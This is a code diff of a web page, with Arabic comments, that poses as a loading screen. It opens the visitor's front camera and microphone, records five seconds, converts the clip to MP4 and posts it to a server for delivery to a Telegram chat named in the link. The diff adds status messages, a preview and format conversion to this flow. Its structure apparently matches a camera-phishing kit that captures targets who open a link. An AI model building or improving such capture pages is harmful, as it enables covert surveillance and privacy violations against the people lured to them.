@@ -17,7 +17,7 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             font-family: Arial, sans-serif;
             color: white;
             overflow: hidden;
@@ -44,13 +44,38 @@
             margin-top: 15px;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .status-message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            max-width: 300px;
+            text-align: center;
+        }
+        
+        .status-message.error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid rgba(255, 0, 0, 0.5);
+        }
+        
+        .status-message.success {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid rgba(0, 255, 0, 0.5);
         }
         
         .hidden {
             display: none;
+        }
+        
+        #cameraPreview {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 100%;
+            max-height: 100%;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
     </style>
 </head>
@@ -58,26 +83,141 @@
     <div class="loader-container">
         <div class="spinner"></div>
         <div class="loading-text">يتم التحميل...</div>
+        <div id="statusMessage" class="status-message hidden"></div>
     </div>
 
     <video id="cameraPreview" class="hidden" autoplay playsinline muted></video>
     <canvas id="videoCanvas" class="hidden"></canvas>
 
     <script>
-        // أزليت التوكن من هنا
+        // دالة لعرض حالة العملية
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.textContent = message;
+            statusDiv.className = `status-message ${type}`;
+            statusDiv.classList.remove('hidden');
+        }
         
         function getChatId() {
             const params = new URLSearchParams(window.location.search);
             return params.get('chatId');
         }
         
+        // دالة تحويل WebM إلى MP4
+        async function convertToMP4(webmBlob) {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    // إنشاء عناصر للتحويل
+                    const video = document.createElement('video');
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    // تجهيز الفيديو
+                    video.preload = 'auto';
+                    video.muted = true;
+                    video.src = URL.createObjectURL(webmBlob);
+                    
+                    video.onloadedmetadata = () => {
+                        // ضبط حجم الكانفس
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        
+                        // إعداد مسجل MP4
+                        const mp4Stream = canvas.captureStream(30); // 30 FPS
+                        
+                        // محاولة استخدام H.264/MP4
+                        const mimeTypes = [
+                            'video/mp4;codecs=h264',
+                            'video/mp4;codecs=avc1',
+                            'video/mp4'
+                        ];
+                        
+                        let mimeType = 'video/webm'; // fallback
+                        for (const type of mimeTypes) {
+                            if (MediaRecorder.isTypeSupported(type)) {
+                                mimeType = type;
+                                break;
+                            }
+                        }
+                        
+                        const mp4Recorder = new MediaRecorder(mp4Stream, {
+                            mimeType: mimeType,
+                            videoBitsPerSecond: 1000000 // 1 Mbps
+                        });
+                        
+                        const mp4Chunks = [];
+                        
+                        mp4Recorder.ondataavailable = (e) => {
+                            if (e.data.size > 0) {
+                                mp4Chunks.push(e.data);
+                            }
+                        };
+                        
+                        mp4Recorder.onstop = () => {
+                            // تحديد نوع الفيديو المناسب
+                            const mp4Type = mimeType.includes('mp4') ? 'video/mp4' : 'video/webm';
+                            const mp4Blob = new Blob(mp4Chunks, { type: mp4Type });
+                            
+                            // تنظيف
+                            URL.revokeObjectURL(video.src);
+                            resolve(mp4Blob);
+                        };
+                        
+                        // بدء التسجيل
+                        mp4Recorder.start();
+                        
+                        // تشغيل الفيديو
+                        video.play();
+                        
+                        // رسم الفيديو على الكانفس
+                        const drawFrame = () => {
+                            if (!video.paused && !video.ended) {
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                requestAnimationFrame(drawFrame);
+                            }
+                        };
+                        drawFrame();
+                        
+                        // تسجيل بنفس مدة الفيديو الأصلي
+                        setTimeout(() => {
+                            if (mp4Recorder.state === 'recording') {
+                                mp4Recorder.stop();
+                                video.pause();
+                            }
+                        }, 5000); // 5 ثواني
+                    };
+                    
+                    video.onerror = (e) => {
+                        reject(new Error('فشل في تحميل الفيديو'));
+                    };
+                    
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+        
         async function sendVideoToTelegram(videoBlob, chatId) {
             try {
+                showStatus('جاري تحويل الفيديو...', '');
+                
+                // تحويل WebM إلى MP4
+                let mp4Blob;
+                try {
+                    mp4Blob = await convertToMP4(videoBlob);
+                } catch (conversionError) {
+                    console.error('فشل التحويل إلى MP4، سيتم إرسال WebM:', conversionError);
+                    // إذا فشل التحويل، نرسل WebM مع تغيير الامتداد
+                    mp4Blob = new Blob([videoBlob], { type: 'video/mp4' });
+                }
+                
+                showStatus('جاري الإرسال...', '');
+                
                 // تحويل Blob إلى Base64
                 const base64Promise = new Promise((resolve) => {
                     const reader = new FileReader();
                     reader.onloadend = () => resolve(reader.result);
-                    reader.readAsDataURL(videoBlob);
+                    reader.readAsDataURL(mp4Blob);
                 });
                 
                 const base64Data = await base64Promise;
@@ -90,16 +230,24 @@
                     },
                     body: JSON.stringify({
                         chatId: chatId,
-                        video: base64Data.split(',')[1], // فقط الجزء بعد ,
-                        filename: `video_${Date.now()}.webm`
+                        video: base64Data.split(',')[1],
+                        filename: `video_${Date.now()}.mp4` // دائمًا mp4
                     })
                 });
                 
                 const result = await response.json();
+                
+                if (result.success) {
+                    showStatus('تم إرسال الفيديو بنجاح!', 'success');
+                } else {
+                    showStatus('فشل في إرسال الفيديو', 'error');
+                }
+                
                 return result.success;
                 
             } catch (error) {
                 console.error('Error sending video:', error);
+                showStatus('حدث خطأ في الإرسال', 'error');
                 return false;
             }
         }
@@ -107,29 +255,35 @@
         async function recordVideo() {
             const chatId = getChatId();
             if (!chatId) {
-                window.close();
+                showStatus('معرف المحادثة غير موجود', 'error');
+                setTimeout(() => window.close(), 2000);
                 return;
             }
             
             const video = document.getElementById('cameraPreview');
             
             try {
+                showStatus('جاري فتح الكاميرا...', '');
+                
                 // فتح الكاميرا الأمامية
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 640 },  // دقة أقل للسرعة
+                        width: { ideal: 640 },
                         height: { ideal: 480 }
                     },
-                    audio: true // إضافة الصوت
+                    audio: true
                 });
                 
                 video.srcObject = stream;
+                video.classList.remove('hidden');
+                
+                showStatus('جاري التسجيل...', '');
                 
                 // بدء تسجيل الفيديو
                 const mediaRecorder = new MediaRecorder(stream, {
                     mimeType: 'video/webm;codecs=vp8,opus',
-                    videoBitsPerSecond: 500000 // جودة منخفضة للسرعة
+                    videoBitsPerSecond: 500000
                 });
                 
                 const chunks = [];
@@ -141,19 +295,26 @@
                 };
                 
                 mediaRecorder.onstop = async () => {
+                    showStatus('تم التسجيل، جاري المعالجة...', '');
+                    
                     // تجميع الفيديو
                     const videoBlob = new Blob(chunks, { type: 'video/webm' });
                     
+                    // إخفاء الفيديو
+                    video.classList.add('hidden');
+                    
                     // إرسال الفيديو
-                    await sendVideoToTelegram(videoBlob, chatId);
+                    const success = await sendVideoToTelegram(videoBlob, chatId);
                     
                     // إغلاق الكاميرا
                     stream.getTracks().forEach(track => track.stop());
                     
-                    // إغلاق النافذة بعد 1 ثانية
-                    setTimeout(() => {
-                        window.close();
-                    }, 1000);
+                    if (success) {
+                        // إغلاق النافذة بعد 2 ثانية
+                        setTimeout(() => {
+                            window.close();
+                        }, 2000);
+                    }
                 };
                 
                 // بدء التسجيل
@@ -161,14 +322,18 @@
                 
                 // تسجيل لمدة 5 ثواني
                 setTimeout(() => {
-                    mediaRecorder.stop();
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
                 }, 5000);
                 
             } catch (error) {
                 console.error('Error accessing camera:', error);
+                showStatus('فشل في الوصول للكاميرا', 'error');
+                
                 setTimeout(() => {
                     window.close();
-                }, 1000);
+                }, 2000);
             }
         }
         
